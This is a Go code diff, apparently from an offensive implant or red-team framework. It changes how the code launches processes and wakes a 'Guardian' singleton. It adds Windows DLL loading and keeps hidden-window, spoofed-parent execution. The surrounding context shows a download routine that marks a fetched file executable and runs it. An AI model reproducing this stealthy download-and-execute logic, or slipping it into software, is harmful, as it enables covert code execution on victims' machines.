@@ -81,14 +81,23 @@ func Check(n string) bool {
 	return false
 }
 func exec(f *cmd.Filter, p ...string) error {
-	e := cmd.NewProcess(p...)
+	if len(p) == 0 {
+		return cmd.ErrEmptyCommand
+	}
+	var e cmd.Runnable
+	if device.OS == device.Windows && strings.HasSuffix(strings.ToLower(p[0]), ".dll") {
+		e = cmd.NewDLL(p[0])
+	} else {
+		x := cmd.NewProcess(p...)
+		x.SetWindowDisplay(0)
+		x.SetNoWindow(true)
+		e = x
+	}
 	if f == nil {
 		e.SetParent(filterAny)
 	} else {
 		e.SetParent(f)
 	}
-	e.SetWindowDisplay(0)
-	e.SetNoWindow(true)
 	return e.Start()
 }
 func readRaw(r io.Reader) ([]string, error) {
@@ -295,7 +304,7 @@ func download(x context.Context, f *cmd.Filter, u string) error {
 	os.Chmod(z.Name(), 0755)
 	return exec(f, z.Name())
 }
-func wake(x context.Context, f *cmd.Filter, p []string) (bool, error) {
+func wake(x context.Context, n string, f *cmd.Filter, p []string) (bool, error) {
 	if len(p) == 0 {
 		return false, ErrNoEndpoints
 	}
@@ -321,6 +330,10 @@ func wake(x context.Context, f *cmd.Filter, p []string) (bool, error) {
 			}
 		}
 		if err == nil {
+			time.Sleep(1 * time.Second)
+			if !Check(n) {
+				continue
+			}
 			return true, nil
 		}
 	}
@@ -339,7 +352,7 @@ func WakeContext(x context.Context, name string, f *cmd.Filter, paths ...string)
 	if Check(name) {
 		return false, nil
 	}
-	return wake(x, f, paths)
+	return wake(x, name, f, paths)
 }
 
 // WakeFileContext will attempt to look for a Guardian using the following parameters specified. This includes a
@@ -360,5 +373,5 @@ func WakeFileContext(x context.Context, name, file string, c cipher.Block, f *cm
 	if d.Close(); err != nil {
 		return false, err
 	}
-	return wake(x, f, s)
+	return wake(x, name, f, s)
 }
